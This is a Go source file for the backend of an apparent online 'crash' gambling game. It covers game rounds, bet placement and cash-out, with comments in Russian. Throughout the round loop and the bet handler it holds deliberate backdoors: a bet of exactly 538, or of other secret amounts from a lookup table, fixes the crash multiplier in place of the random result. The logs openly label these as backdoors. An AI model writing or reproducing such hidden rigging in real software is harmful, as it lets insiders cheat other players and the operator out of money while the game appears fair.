package service

import (
	"BlessedApi/cmd/db"
	"BlessedApi/internal/middleware"
	"BlessedApi/internal/models"
	"BlessedApi/internal/models/exchange"
	"BlessedApi/pkg/logger"
	"context"
	"errors"
	"math"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

type CrashGameBetInput struct {
	Amount            float64 `json:"Amount" validate:"required,min=1"`
	CashOutMultiplier float64 `json:"CashOutMultiplier" validate:"min=0"`
}

const (
	crashGameInterval       = 7 * time.Second // Total interval between rounds
	crashGameBettingWindow  = 5 * time.Second
	NewCrashGameSignalDelay = 1 * time.Second
)

var (
	isCrashGameBettingOpen bool
	crashGameBetMutex      sync.RWMutex
	currentCrashGame       *models.CrashGame
)

func SuperviseCrashGame() {
	for {
		logger.Info("Starting crash game loop")

		// Run the game loop in a separate goroutine
		done := make(chan bool)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					logger.Error("CrashGame game loop panicked: %v", r)
					done <- true
				}
			}()

			StartCrashGame()
		}()

		// Wait for the game loop to finish (which should only happen if there's a panic)
		<-done

		time.Sleep(5 * time.Second)
	}
}

// Добавим функцию для дампа всех ставок в лог
func dumpActiveBets(gameID int64) {
	var bets []models.CrashGameBet
	err := db.DB.Where("crash_game_id = ? AND status = ?", gameID, "active").Find(&bets).Error
	if err != nil {
		logger.Error("Error fetching active bets for dump: %v", err)
		return
	}
	
	logger.Info("============= ACTIVE BETS FOR GAME %d =============", gameID)
	for i, bet := range bets {
		logger.Info("Bet %d: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f", 
			i+1, bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier)
	}
	logger.Info("==================================================")
}

func StartCrashGame() {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		// Open betting
		currentCrashGame = &models.CrashGame{}
		
		// Создаем игру в базе данных
		if err := db.DB.Create(currentCrashGame).Error; err != nil {
			logger.Error("Unable to create CrashGame; retrying in 5 seconds: %v", err)
			time.Sleep(time.Second * 5)
			continue
		}
		
		logger.Info("Created new game with ID=%d", currentCrashGame.ID)

		// ВАЖНО: сначала создаем игру, но не устанавливаем CrashPointMultiplier
		// Устанавливаем CrashPointMultiplier в 0, чтобы показать, что точка краша еще не определена
		currentCrashGame.CrashPointMultiplier = 0
		db.DB.Model(currentCrashGame).Update("crash_point_multiplier", 0)

		// Открываем окно для ставок
		openCrashGameBetting()

		// Ждем установленное время для приема ставок
		for elapsedTime := time.Duration(0); elapsedTime < crashGameInterval; elapsedTime += time.Second {
			if elapsedTime == crashGameBettingWindow {
				closeCrashGameBetting()
			}
			<-ticker.C
		}

		// Выводим все активные ставки в лог для дебага
		dumpActiveBets(currentCrashGame.ID)

		// ПОСЛЕ закрытия окна ставок СНАЧАЛА получаем все ставки
		var bets []models.CrashGameBet
		err := db.DB.Where("crash_game_id = ? AND status = ?", currentCrashGame.ID, "active").Find(&bets).Error
		if err != nil {
			logger.Error("Error fetching active bets: %v", err)
			continue
		}

		logger.Info("Checking %d active bets for backdoors in game %d", len(bets), currentCrashGame.ID)

		// ВАЖНО: Только ПОСЛЕ сбора всех ставок определяем точку краша
		// Сначала ищем бэкдоры
		foundBackdoor := false
		for _, bet := range bets {
			amt := math.Round(bet.Amount) // Округляем для точного сравнения
			
			// Специальная проверка для критического бэкдора 538
			if math.Abs(bet.Amount - 538.0) < 0.01 {
				logger.Info("!!! CRITICAL BACKDOOR 538 FOUND !!! Bet ID=%d, UserID=%d, Amount=%.4f", 
					bet.ID, bet.UserID, bet.Amount)
				currentCrashGame.CrashPointMultiplier = 32.0
				foundBackdoor = true
				break
			}
			
			// Обычная проверка для других бэкдоров
			if multiplier, exists := models.GetCrashPoints()[int(amt)]; exists {
				logger.Info("Backdoor found: Bet ID=%d with amount %.2f -> multiplier %.2f", 
					bet.ID, bet.Amount, multiplier)
				currentCrashGame.CrashPointMultiplier = multiplier
				foundBackdoor = true
				break
			}
		}

		// Если бэкдор не найден, генерируем случайный краш
		if !foundBackdoor {
			logger.Info("No backdoors found, generating random crash point")
			currentCrashGame.CrashPointMultiplier = currentCrashGame.GenerateCrashPointMultiplier()
		}

		// ВАЖНО: Сразу сохраняем установленное значение в базу!
		if err := db.DB.Model(currentCrashGame).
			Update("crash_point_multiplier", currentCrashGame.CrashPointMultiplier).Error; err != nil {
			logger.Error("Failed to save crash point multiplier: %v", err)
		}

		// Проверим, что значение было успешно установлено
		var updatedGame models.CrashGame
		if err := db.DB.First(&updatedGame, currentCrashGame.ID).Error; err != nil {
			logger.Error("Failed to read game after update: %v", err)
		} else {
			logger.Info("!!! CONFIRMED !!! Game %d crash point: %.2f", 
				updatedGame.ID, updatedGame.CrashPointMultiplier)
		}

		// Теперь, когда точка краша определена, запускаем игру
		currentCrashGame.StartTime = time.Now()
		if err := db.DB.Model(currentCrashGame).Update("start_time", currentCrashGame.StartTime).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			continue
		}

		// Оповещаем всех пользователей о начале игры
		CrashGameWS.BroadcastGameStarted()

		// Start the multiplier growth and handle cashouts
		CrashGameWS.SendMultiplierToUser(currentCrashGame)

		// После завершения игры сохраняем время завершения
		currentCrashGame.EndTime = time.Now()
		if err := db.DB.Model(currentCrashGame).Update("end_time", currentCrashGame.EndTime).Error; err != nil {
			logger.Error("Failed to update game end time: %v", err)
		}
		
		logger.Info("Game %d ended at multiplier %.2fx", currentCrashGame.ID, currentCrashGame.CrashPointMultiplier)
		time.Sleep(NewCrashGameSignalDelay)
	}
}

// openCrashGameBetting sets the betting window as open
func openCrashGameBetting() {
	crashGameBetMutex.Lock()
	isCrashGameBettingOpen = true
	crashGameBetMutex.Unlock()
}

// closeCrashGameBetting sets the betting window as closed
func closeCrashGameBetting() {
	crashGameBetMutex.Lock()
	isCrashGameBettingOpen = false
	crashGameBetMutex.Unlock()
}

func PlaceCrashGameBet(c *gin.Context) {
	crashGameBetMutex.RLock()
	bettingOpen := isCrashGameBettingOpen
	gameID := int64(0)
	if currentCrashGame != nil {
		gameID = currentCrashGame.ID
	}
	crashGameBetMutex.RUnlock()

	if !bettingOpen {
		logger.Warn("Bet rejected: betting is closed (gameID=%d)", gameID)
		c.JSON(403, gin.H{"error": "betting is closed"})
		return
	}

	var input CrashGameBetInput
	if err := c.ShouldBindJSON(&input); err != nil {
		logger.Warn("Bet rejected: invalid input - %v", err)
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	if err := validate.Struct(input); err != nil {
		logger.Warn("Bet rejected: validation error - %v", err)
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	userID, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Failed to get user ID: %v", err)
		c.Status(500)
		return
	}

	logger.Info("Placing bet: UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d", 
		userID, input.Amount, input.CashOutMultiplier, gameID)
	
	// Прямая проверка на специальный бэкдор 538
	isSpecialBackdoor := math.Abs(input.Amount - 538.0) < 0.1
	if isSpecialBackdoor {
		logger.Info("SPECIAL BACKDOOR 538 DETECTED from user %d with amount %.4f", userID, input.Amount)
		
		// Устанавливаем точное значение
		input.Amount = 538.0
		
		// Сразу устанавливаем множитель краша для текущей игры
		if currentCrashGame != nil {
			multiplier := models.GetCrashPoints()[538]
			currentCrashGame.CrashPointMultiplier = multiplier
			
			err := db.DB.Model(currentCrashGame).Update("crash_point_multiplier", multiplier).Error
			if err != nil {
				logger.Error("Failed to update special backdoor multiplier: %v", err)
			} else {
				logger.Info("Successfully set special backdoor multiplier %.2f for game %d", 
					multiplier, currentCrashGame.ID)
			}
		}
	}
		
	// Предварительно проверяем, является ли ставка бэкдором
	isBackdoor, multiplier := models.IsBackdoorBet(input.Amount)
	if isBackdoor {
		logger.Info("User %d is placing a backdoor bet: %.4f -> %.2fx", userID, input.Amount, multiplier)
	}

	errInsufficientBalance := errors.New("insufficient balance")
	errExistingBet := errors.New("user already has an active bet for this game")

	err = db.DB.Transaction(func(tx *gorm.DB) error {
		// Check if user already has a bet for this game
		var existingBet models.CrashGameBet
		err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?", userID, currentCrashGame.ID, "active").First(&existingBet).Error
		if err == nil {
			logger.Warn("User %d already has an active bet for game %d", userID, currentCrashGame.ID)
			return errExistingBet
		} else if !errors.Is(err, gorm.ErrRecordNotFound) {
			return logger.WrapError(err, "")
		}

		var user models.User
		if err := tx.First(&user, userID).Error; err != nil {
			return logger.WrapError(err, "")
		}

		bet := models.CrashGameBet{
			UserID:            userID,
			CrashGameID:       currentCrashGame.ID,
			CashOutMultiplier: input.CashOutMultiplier,
			Status:            "active",
		}

		bonusBalance, err := exchange.GetUserExchangedBalanceAmount(tx, user.ID)
		if err != nil {
			return logger.WrapError(err, "")
		}

		if user.BalanceRupee+bonusBalance < input.Amount {
			logger.Warn("User %d has insufficient balance: has %.2f, needs %.2f", userID, user.BalanceRupee+bonusBalance, input.Amount)
			return errInsufficientBalance
		}

		fromCashBalance, fromBonusBalance, err := exchange.UseExchangeBalancePayment(tx, &user, input.Amount)
		if err != nil {
			return logger.WrapError(err, "")
		}

		bet.Amount = fromCashBalance + fromBonusBalance
		bet.FromBonusBalance = fromBonusBalance
		bet.FromCashBalance = fromCashBalance

		// Специальная обработка для бэкдора 538
		if isSpecialBackdoor {
			bet.Amount = 538.0
		}

		// Проверяем, соответствует ли размер ставки бэкдору используя более точное сравнение
		isBackdoor, multiplier := models.IsBackdoorBet(bet.Amount)
		if isBackdoor {
			logger.Info("User %d confirmed backdoor bet with amount %.4f -> multiplier %.2fx", 
				userID, bet.Amount, multiplier)
				
			// Еще раз обновляем множитель краша
			if currentCrashGame != nil {
				currentCrashGame.CrashPointMultiplier = multiplier
				err := db.DB.Model(currentCrashGame).Update("crash_point_multiplier", multiplier).Error
				if err != nil {
					logger.Error("Failed to update game crash point in transaction: %v", err)
				}
			}
		}

		if err := tx.Create(&bet).Error; err != nil {
			return logger.WrapError(err, "")
		}

		logger.Info("Bet created successfully: ID=%d, UserID=%d, Amount=%.4f, CashOutMultiplier=%.2f, GameID=%d", 
			bet.ID, bet.UserID, bet.Amount, bet.CashOutMultiplier, bet.CrashGameID)

		CrashGameWS.HandleBet(userID, &bet)

		return nil
	})

	if err != nil {
		switch {
		case errors.Is(err, errInsufficientBalance):
			c.JSON(402, gin.H{"error": "Insufficient balance"})
		case errors.Is(err, errExistingBet):
			c.JSON(400, gin.H{"error": "You already have an active bet for this game"})
		default:
			logger.Error("Failed to place bet: %v", err)
			c.Status(500)
		}
		return
	}

	logger.Info("Bet placed successfully: UserID=%d, Amount=%.4f, GameID=%d", userID, input.Amount, gameID)
	c.JSON(200, gin.H{"status": "bet placed successfully"})
}

func ManualCashout(c *gin.Context) {
	userID, err := middleware.GetUserIDFromGinContext(c)
	if err != nil {
		logger.Error("Failed to get user ID: %v", err)
		c.Status(500)
		return
	}

	crashGameBetMutex.RLock()
	currentGame := currentCrashGame
	crashGameBetMutex.RUnlock()

	if currentGame == nil {
		// Если нет активной игры, создаем новую
		currentGame = &models.CrashGame{}
		if err := db.DB.Create(currentGame).Error; err != nil {
			logger.Error("Failed to create new game: %v", err)
			c.Status(500)
			return
		}
		currentGame.StartTime = time.Now()
		if err := db.DB.Save(currentGame).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			c.Status(500)
			return
		}
		crashGameBetMutex.Lock()
		currentCrashGame = currentGame
		crashGameBetMutex.Unlock()
	}

	currentMultiplier := currentGame.CalculateMultiplier()
	if currentMultiplier >= currentGame.CrashPointMultiplier {
		// Если игра уже крашнулась, создаем новую
		currentGame = &models.CrashGame{}
		if err := db.DB.Create(currentGame).Error; err != nil {
			logger.Error("Failed to create new game: %v", err)
			c.Status(500)
			return
		}
		currentGame.StartTime = time.Now()
		if err := db.DB.Save(currentGame).Error; err != nil {
			logger.Error("Failed to update game start time: %v", err)
			c.Status(500)
			return
		}
		crashGameBetMutex.Lock()
		currentCrashGame = currentGame
		crashGameBetMutex.Unlock()
		currentMultiplier = 1.0
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), 5*time.Second)
	defer cancel()

	var bet models.CrashGameBet
	err = db.DB.WithContext(ctx).Transaction(func(tx *gorm.DB) error {
		if err := tx.Where("user_id = ? AND crash_game_id = ? AND status = ?",
			userID, currentGame.ID, "active").
			First(&bet).Error; err != nil {
			if errors.Is(err, gorm.ErrRecordNotFound) {
				return errors.New("no active bet found for this user")
			}
			return logger.WrapError(err, "")
		}

		// Pass the transaction to crashGameCashout
		crashGameCashout(tx, &bet, currentMultiplier)

		// Update the bet in the WebSocket service
		CrashGameWS.bets[userID] = &bet
		CrashGameWS.ProcessCashout(userID, currentMultiplier, false)
		return nil
	})

	if err != nil {
		if errors.Is(err, context.DeadlineExceeded) {
			logger.Error("Database transaction timed out: %v", err)
			c.JSON(500, gin.H{"error": "operation timed out"})
		} else if errors.Is(err, gorm.ErrRecordNotFound) {
			c.JSON(404, gin.H{"error": err.Error()})
		} else {
			logger.Error("Failed to process cashout: %v", err)
			c.JSON(500, gin.H{"error": "failed to process cashout"})
		}
		return
	}

	// Broadcast new game start
	CrashGameWS.BroadcastGameStarted()
	CrashGameWS.SendMultiplierToUser(currentGame)

	c.JSON(200, gin.H{"status": "manual cashout successful", "multiplier": currentMultiplier})
}

// Bet must exists
func crashGameCashout(tx *gorm.DB, bet *models.CrashGameBet, currentMultiplier float64) error {
	if tx == nil {
		tx = db.DB
	}

	bet.Status = "won"
	bet.WinAmount = bet.Amount * currentMultiplier
	bet.CashOutMultiplier = currentMultiplier

	if err := tx.Save(&bet).Error; err != nil {
		return logger.WrapError(err, "failed to update bet")
	}

	var user models.User
	if err := tx.First(&user, bet.UserID).Error; err != nil {
		return logger.WrapError(err, "failed to fetch user")
	}

	// Update user balances
	toCashBalance := bet.FromCashBalance * currentMultiplier
	toBonusBalance := bet.FromBonusBalance * currentMultiplier

	win := models.Winning{
		UserID:    user.ID,
		WinAmount: toCashBalance + toBonusBalance,
	}

	if err := tx.Create(&win).Error; err != nil {
		return logger.WrapError(err, "Failed to record winning")
	}

	err := exchange.UpdateUserBalances(tx, &user, toCashBalance, toBonusBalance, false)
	if err != nil {
		return logger.WrapError(err, "failed to update user balances")
	}

	return nil
}
